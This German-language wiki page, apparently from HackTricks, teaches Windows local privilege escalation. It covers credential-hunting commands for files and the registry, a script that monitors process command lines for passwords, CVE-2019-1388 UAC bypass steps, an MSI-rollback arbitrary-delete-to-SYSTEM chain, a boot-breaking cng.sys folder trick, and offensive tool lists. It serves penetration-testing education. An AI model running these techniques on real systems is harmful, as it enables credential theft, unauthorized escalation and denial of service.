**Component Object Model (COM)** ist eine im Windows-Betriebssystem integrierte Technologie, die die **Interkommunikation** zwischen Softwarekomponenten in verschiedenen Programmiersprachen ermöglicht. Jede COM-Komponente wird durch eine class ID (CLSID) identifiziert und jede Komponente stellt Funktionalität über ein oder mehrere Interfaces bereit, die durch interface IDs (IIDs) identifiziert werden.

COM-Klassen und -Interfaces sind in der Registry unter **HKEY\CLASSES\ROOT\CLSID** bzw. **HKEY\CLASSES\ROOT\Interface** definiert. Diese Registry entsteht durch das Zusammenführen von **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

In den CLSIDs dieser Registry findet man den Unterschlüssel **InProcServer32**, der einen **Standardwert** enthält, der auf eine **DLL** zeigt, sowie einen Wert namens **ThreadingModel**, der **Apartment** (einzelner Thread), **Free** (mehrere Threads), **Both** (ein- oder mehrthreadig) oder **Neutral** (thread-neutral) sein kann.

![](<../../images/image (729).png>)

Im Grunde: Wenn Sie **eine der auszuführenden DLLs überschreiben** können, könnten Sie **Privilegien eskalieren**, wenn diese DLL von einem anderen Benutzer ausgeführt wird.

Um zu erfahren, wie Angreifer COM Hijacking als Persistenzmechanismus nutzen, siehe:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Allgemeine Passwortsuche in Dateien und Registry**

**Suche nach Dateiinhalten**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Nach einer Datei mit einem bestimmten Dateinamen suchen**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Durchsuche die registry nach Schlüsselnamen und Passwörtern**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Tools, die nach passwords suchen

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin. Ich habe dieses Plugin erstellt, um **automatisch jedes metasploit POST module auszuführen, das nach credentials im victim sucht**.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) durchsucht automatisch alle Dateien, die passwords enthalten, die auf dieser Seite erwähnt werden.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) ist ein weiteres großartiges Tool, um passwords aus einem System zu extrahieren.

Das Tool [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) durchsucht **sessions**, **usernames** und **passwords** mehrerer Programme, die diese Daten im Klartext speichern (PuTTY, WinSCP, FileZilla, SuperPuTTY und RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Stell dir vor, dass **ein als SYSTEM laufender Prozess einen neuen Prozess** (`OpenProcess()`) mit **voller Zugriff** öffnet. Derselbe Prozess **erstellt außerdem einen neuen Prozess** (`CreateProcess()`) **mit geringen Rechten, der jedoch alle offenen Handles des Hauptprozesses erbt**.  
Wenn du dann **vollen Zugriff auf den niedrig privilegierten Prozess** hast, kannst du das **offene Handle zum privilegierten Prozess**, das mit `OpenProcess()` erstellt wurde, übernehmen und **Shellcode injizieren**.  
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)  
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Shared memory segments, referred to as **pipes**, ermöglichen Prozesskommunikation und Datenaustausch.

Windows bietet eine Funktion namens **Named Pipes**, die es nicht zusammenhängenden Prozessen erlaubt, Daten zu teilen — sogar über verschiedene Netzwerke. Das ähnelt einer Client/Server-Architektur, mit Rollen als **named pipe server** und **named pipe client**.

Wenn Daten durch eine Pipe von einem **Client** gesendet werden, kann der **Server**, der die Pipe eingerichtet hat, die **Identität** des **Clients annehmen**, vorausgesetzt er besitzt die nötigen **SeImpersonate**-Rechte. Das Auffinden eines **privilegierten Prozesses**, der über eine Pipe kommuniziert, die du nachahmen kannst, bietet die Möglichkeit, **höhere Rechte** zu erlangen, indem du die Identität dieses Prozesses annimmst, sobald er mit der von dir eingerichteten Pipe interagiert. Anleitungen zur Durchführung eines solchen Angriffs findest du [**hier**](named-pipe-client-impersonation.md) und [**hier**](#from-high-integrity-to-system).

Außerdem ermöglicht das folgende Tool das **Abfangen einer named pipe Kommunikation mit einem Tool wie burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **und dieses Tool erlaubt das Auflisten und Anzeigen aller Pipes, um Privescs zu finden** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Sonstiges

### Dateiendungen, die in Windows etwas ausführen könnten

Sieh dir die Seite **[https://filesec.io/](https://filesec.io/)** an

### Überwachung von Befehlszeilen auf Passwörter

Wenn du eine Shell als ein Benutzer erhältst, kann es geplante Tasks oder andere Prozesse geben, die ausgeführt werden und **Credentials in der Befehlszeile übergeben**. Das folgende Skript erfasst Prozess-Befehlszeilen alle zwei Sekunden und vergleicht den aktuellen Zustand mit dem vorherigen, wobei es alle Unterschiede ausgibt.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Passwörter aus Prozessen stehlen

## Vom Low Priv User zu NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Wenn Sie Zugriff auf die grafische Oberfläche (über Konsole oder RDP) haben und UAC aktiviert ist, ist es in einigen Versionen von Microsoft Windows möglich, ein Terminal oder jeden anderen Prozess wie "NT\AUTHORITY SYSTEM" von einem unprivilegierten Benutzer aus zu starten.

Das macht es möglich, mit derselben Schwachstelle Privilegien zu eskalieren und UAC gleichzeitig zu umgehen. Außerdem ist es nicht nötig, etwas zu installieren, und die während des Vorgangs verwendete binary ist von Microsoft signiert und ausgestellt.

Einige der betroffenen Systeme sind die folgenden:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Um diese Schwachstelle auszunutzen, sind die folgenden Schritte erforderlich:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
Sie haben alle notwendigen Dateien und Informationen im folgenden GitHub-Repository:

https://github.com/jas502n/CVE-2019-1388

## Von Administrator (Medium) zu High Integrity Level / UAC Bypass

Lies dies, um mehr über Integrity Levels zu erfahren:


{{#ref}}
integrity-levels.md
{{#endref}}

Lies anschließend dies, um mehr über UAC und UAC bypasses zu erfahren:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

Die Technik, die [**in diesem Blogpost**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) beschrieben wird, mit Exploit-Code [**hier verfügbar**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Der Angriff besteht im Wesentlichen darin, die Rollback-Funktion des Windows Installer auszunutzen, um legitime Dateien während des Deinstallationsprozesses durch bösartige zu ersetzen. Dafür muss der Angreifer einen **malicious MSI installer** erstellen, der verwendet wird, um den Ordner `C:\Config.Msi` zu kapern. Dieser Ordner wird später vom Windows Installer verwendet, um Rollback-Dateien während der Deinstallation anderer MSI-Pakete zu speichern, wobei die Rollback-Dateien so verändert werden, dass sie die bösartige Nutzlast enthalten.

Die zusammengefasste Technik ist wie folgt:

1. **Stage 1 – Vorbereitung der Übernahme (`C:\Config.Msi` leer lassen)**

- Schritt 1: Installiere die MSI
- Erstelle eine `.msi`, die eine harmlose Datei (z. B. `dummy.txt`) in einen beschreibbaren Ordner (`TARGETDIR`) installiert.
- Kennzeichne den Installer als **"UAC Compliant"**, sodass ein **Nicht-Admin-Benutzer** ihn ausführen kann.
- Halte nach der Installation einen **Handle** auf die Datei offen.

- Schritt 2: Beginne die Deinstallation
- Deinstalliere dieselbe `.msi`.
- Der Deinstallationsprozess beginnt, Dateien nach `C:\Config.Msi` zu verschieben und sie in `.rbf`-Dateien (Rollback-Backups) umzubenennen.
- **Poll** den offenen Datei-Handle mit `GetFinalPathNameByHandle`, um zu erkennen, wann die Datei zu `C:\Config.Msi\<random>.rbf` wird.

- Schritt 3: Custom Syncing
- Die `.msi` enthält eine **custom uninstall action (`SyncOnRbfWritten`)**, die:
- signalisiert, wenn `.rbf` geschrieben wurde.
- und dann auf ein anderes Event wartet, bevor die Deinstallation fortgesetzt wird.

- Schritt 4: Löschen der `.rbf` blockieren
- Wenn signalisiert, **öffne die `.rbf`-Datei** ohne `FILE_SHARE_DELETE` — das **verhindert, dass sie gelöscht wird**.
- Dann **signalisiere zurück**, damit die Deinstallation abgeschlossen werden kann.
- Der Windows Installer kann die `.rbf` nicht löschen, und weil er nicht alle Inhalte löschen kann, **wird `C:\Config.Msi` nicht entfernt**.

- Schritt 5: `.rbf` manuell löschen
- Du (der Angreifer) löschst die `.rbf`-Datei manuell.
- Jetzt ist **`C:\Config.Msi` leer** und bereit zur Übernahme.

> An diesem Punkt, **löse die SYSTEM-level arbitrary folder delete vulnerability aus**, um `C:\Config.Msi` zu löschen.

2. **Stage 2 – Ersetzen der Rollback-Skripte durch bösartige**

- Schritt 6: `C:\Config.Msi` mit schwachen ACLs neu erstellen
- Erstelle den Ordner `C:\Config.Msi` selbst neu.
- Setze **schwache DACLs** (z. B. Everyone:F), und **halte einen Handle** mit `WRITE_DAC` offen.

- Schritt 7: Führe eine weitere Installation aus
- Installiere die `.msi` erneut, mit:
- `TARGETDIR`: beschreibbarer Ort.
- `ERROROUT`: Eine Variable, die einen erzwungenen Fehler auslöst.
- Diese Installation wird verwendet, um erneut einen **Rollback** auszulösen, der `.rbs` und `.rbf` liest.

- Schritt 8: Auf `.rbs` überwachen
- Verwende `ReadDirectoryChangesW`, um `C:\Config.Msi` zu überwachen, bis eine neue `.rbs` erscheint.
- Merke dir ihren Dateinamen.

- Schritt 9: Sync vor dem Rollback
- Die `.msi` enthält eine **custom install action (`SyncBeforeRollback`)**, die:
- ein Event signalisiert, wenn die `.rbs` erstellt wurde.
- und dann wartet, bevor sie fortfährt.

- Schritt 10: Schwache ACLs erneut anwenden
- Nachdem das `rbs created`-Event empfangen wurde:
- Wendet der Windows Installer **starke ACLs** auf `C:\Config.Msi` an.
- Da du jedoch noch einen Handle mit `WRITE_DAC` hast, kannst du die **schwachen ACLs erneut anwenden**.

> ACLs werden **nur beim Öffnen eines Handles durchgesetzt**, daher kannst du weiterhin in den Ordner schreiben.

- Schritt 11: Fake `.rbs` und `.rbf` ablegen
- Überschreibe die `.rbs`-Datei mit einem **gefälschten Rollback-Skript**, das Windows anweist:
- deine `.rbf`-Datei (bösartige DLL) in einen **privilegierten Pfad** wiederherzustellen (z. B. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Lege deine gefälschte `.rbf` ab, die eine **bösartige SYSTEM-level Payload-DLL** enthält.

- Schritt 12: Den Rollback auslösen
- Signalisiere das Sync-Event, damit der Installer fortfährt.
- Eine **type 19 custom action (`ErrorOut`)** ist so konfiguriert, dass die Installation an einem bekannten Punkt **absichtlich fehlschlägt**.
- Das verursacht, dass der **Rollback beginnt**.

- Schritt 13: SYSTEM installiert deine DLL
- Der Windows Installer:
- liest dein bösartiges `.rbs`.
- kopiert deine `.rbf`-DLL an den Zielort.
- Du hast nun deine **bösartige DLL in einem SYSTEM-geladenen Pfad**.

- Finaler Schritt: SYSTEM-Code ausführen
- Starte ein vertrauenswürdiges **auto-elevated binary** (z. B. `osk.exe`), das die von dir gekaperte DLL lädt.
- **Boom**: Dein Code wird **als SYSTEM** ausgeführt.

### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

Die Haupt-MSI-Rollback-Technik (die vorherige) geht davon aus, dass du einen **gesamten Ordner** löschen kannst (z. B. `C:\Config.Msi`). Aber was, wenn deine Verwundbarkeit nur **arbitrary file deletion** erlaubt?

Du könntest NTFS-Interna ausnutzen: Jeder Ordner hat einen versteckten alternate data stream namens:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Dieser Stream speichert die **Index-Metadaten** des Ordners.

Wenn du also **den `::$INDEX_ALLOCATION`-Stream eines Ordners löschst**, entfernt NTFS **den gesamten Ordner** aus dem Dateisystem.

Du kannst das mit standardmäßigen Datei-Lösch-APIs wie:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Auch wenn du eine *file* delete API aufrufst, löscht sie **den Ordner selbst**.

### Von der Löschung von Ordnerinhalten zur SYSTEM EoP
Was, wenn dein Primitive es nicht erlaubt, beliebige files/folders zu löschen, aber es **das Löschen der *contents* eines attacker-controlled folder erlaubt**?

1. Schritt 1: Lockvogel-Ordner und -Datei einrichten
- Erstelle: `C:\temp\folder1`
- Darin: `C:\temp\folder1\file1.txt`

2. Schritt 2: Setze ein **oplock** auf `file1.txt`
- Das oplock **pausiert die Ausführung**, wenn ein privilegierter Prozess versucht, `file1.txt` zu löschen.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Schritt 3: SYSTEM-Prozess auslösen (z. B. `SilentCleanup`)
- Dieser Prozess durchsucht Ordner (z. B. `%TEMP%`) und versucht, deren Inhalt zu löschen.
- Wenn er `file1.txt` erreicht, wird die **oplock ausgelöst** und die Kontrolle an deinen Callback übergeben.

4. Schritt 4: Innerhalb des oplock-Callbacks – die Löschung umleiten

- Option A: Verschiebe `file1.txt` an einen anderen Ort
- Damit wird `folder1` geleert, ohne die oplock zu brechen.
- Lösche `file1.txt` nicht direkt — das würde die oplock vorzeitig freigeben.

- Option B: Verwandle `folder1` in eine **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Option C: Erstelle einen **symlink** in `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Dies zielt auf den NTFS-internen Stream, der die Ordner-Metadaten speichert — wenn man ihn löscht, wird der Ordner gelöscht.

5. Schritt 5: oplock freigeben
- Der SYSTEM-Prozess fährt fort und versucht, `file1.txt` zu löschen.
- Aber jetzt löscht er aufgrund der junction + symlink tatsächlich:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Ergebnis**: `C:\Config.Msi` wird von SYSTEM gelöscht.

### Von Arbitrary Folder Create zu Permanent DoS

Nutze eine Primitive, die es dir erlaubt, **create an arbitrary folder as SYSTEM/admin** — selbst wenn du **keine Dateien schreiben** oder **keine schwachen Berechtigungen setzen** kannst.

Erstelle einen **Ordner** (keine Datei) mit dem Namen eines **kritischen Windows-Treibers**, z. B.:
```
C:\Windows\System32\cng.sys
```
- Dieser Pfad entspricht normalerweise dem Kernel-Mode-Treiber `cng.sys`.
- Wenn Sie ihn **vorab als Ordner anlegen**, kann Windows den tatsächlichen Treiber beim Booten nicht laden.
- Dann versucht Windows während des Bootvorgangs, `cng.sys` zu laden.
- Es sieht den Ordner, **kann den eigentlichen Treiber nicht auflösen**, und **stürzt ab oder bricht den Bootvorgang ab**.
- Es gibt **keinen Fallback**, und **keine Wiederherstellung** ohne externe Eingriffe (z. B. Boot-Reparatur oder Festplattenzugriff).


## **Von High Integrity zu SYSTEM**

### **Neuer Service**

Wenn Sie bereits in einem High Integrity-Prozess laufen, kann der **Weg zu SYSTEM** einfach sein, indem Sie **einen neuen Service erstellen und ausführen**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Wenn Sie ein Service-Binary erstellen, stellen Sie sicher, dass es ein gültiger Service ist oder dass das Binary die notwendigen Aktionen schnell ausführt, da es sonst nach 20s beendet wird, wenn es kein gültiger Service ist.

### AlwaysInstallElevated

Von einem High Integrity process aus können Sie versuchen, die AlwaysInstallElevated registry entries zu aktivieren und eine Reverse Shell mit einem _**.msi**_ Wrapper zu **installieren**.\
[Mehr Informationen über die beteiligten Registry-Keys und wie man ein _.msi_ Paket installiert finden Sie hier.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Sie können** [**den Code hier finden**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Wenn Sie diese Token-Privileges haben (wahrscheinlich finden Sie diese bereits in einem High Integrity process), können Sie fast jeden Prozess (keine protected processes) mit dem SeDebug-Privilege öffnen, das Token des Prozesses kopieren und einen beliebigen Prozess mit diesem Token erstellen.\
Bei dieser Technik wird üblicherweise ein Prozess ausgewählt, der als SYSTEM läuft und alle Token-Privileges besitzt (_ja, Sie können SYSTEM-Prozesse ohne alle Token-Privileges finden_).\
**Sie können ein** [**Beispielcode, der die vorgeschlagene Technik ausführt, hier finden**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Diese Technik wird von meterpreter zur Eskalation in `getsystem` verwendet. Die Technik besteht darin, **eine Pipe zu erstellen und dann einen Service zu erstellen/missbrauchen, um in diese Pipe zu schreiben**. Danach kann der **Server**, der die Pipe mit dem **`SeImpersonate`**-Privilege erstellt hat, das Token des Pipe-Clients (des Services) **impersonate** und SYSTEM-Rechte erlangen.\
Wenn Sie [**mehr über Named Pipes lernen möchten, sollten Sie dies lesen**](#named-pipe-client-impersonation).\
Wenn Sie ein Beispiel lesen möchten, [**wie man von High Integrity zu System mit Named Pipes gelangt, lesen Sie dies**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Wenn es Ihnen gelingt, eine dll zu hijacken, die von einem als **SYSTEM** laufenden Prozess geladen wird, können Sie beliebigen Code mit diesen Rechten ausführen. Deshalb ist Dll Hijacking ebenfalls nützlich für diese Art der Privilegieneskalation und darüber hinaus von einem High Integrity process **wesentlich einfacher zu erreichen**, da dieser Schreibrechte auf die Ordner hat, die zum Laden von dlls verwendet werden.\
**Sie können** [**mehr über Dll Hijacking hier erfahren**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Lesen:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Prüft auf Fehlkonfigurationen und sensitive Dateien (**[**hier prüfen**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Erkannt.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Prüft auf mögliche Fehlkonfigurationen und sammelt Informationen (**[**hier prüfen**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Prüft auf Fehlkonfigurationen**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Extrahiert gespeicherte Sitzungsinformationen von PuTTY, WinSCP, SuperPuTTY, FileZilla und RDP. Lokal -Thorough verwenden.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extrahiert Anmeldeinformationen aus dem Credential Manager. Erkannt.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Verteilt gesammelte Passwörter im Domain-Umfeld**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh ist ein PowerShell ADIDNS/LLMNR/mDNS/NBNS Spoofer und Man-in-the-Middle-Tool.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Basis Windows Privesc-Enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- Sucht nach bekannten Privesc-Schwachstellen (DEPRECATED für Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokale Checks **(Benötigt Admin-Rechte)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Sucht nach bekannten Privesc-Schwachstellen (muss mit VisualStudio kompiliert werden) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumeriert das Host-System auf Fehlkonfigurationen (mehr ein Info-Gathering-Tool als Privesc) (muss kompiliert werden) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extrahiert Anmeldeinformationen aus vielen Programmen (precompiled exe im GitHub-Repo)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port von PowerUp nach C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Prüft auf Fehlkonfigurationen (ausführbare Datei precompiled auf GitHub). Nicht empfohlen. Funktioniert nicht gut unter Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Prüft auf mögliche Fehlkonfigurationen (exe aus Python). Nicht empfohlen. Funktioniert nicht gut unter Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool basierend auf diesem Post (benötigt accesschk nicht zwingend, kann es aber verwenden).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Liest die Ausgabe von **systeminfo** und empfiehlt funktionierende Exploits (lokal, Python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Liest die Ausgabe von **systeminfo** und empfiehlt funktionierende Exploits (lokal, Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Sie müssen das Projekt mit der korrekten Version von .NET kompilieren ([siehe dies](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Um die installierte .NET-Version auf dem Zielhost zu sehen, können Sie:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Referenzen

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)

{{#include ../../banners/hacktricks-training.md}}
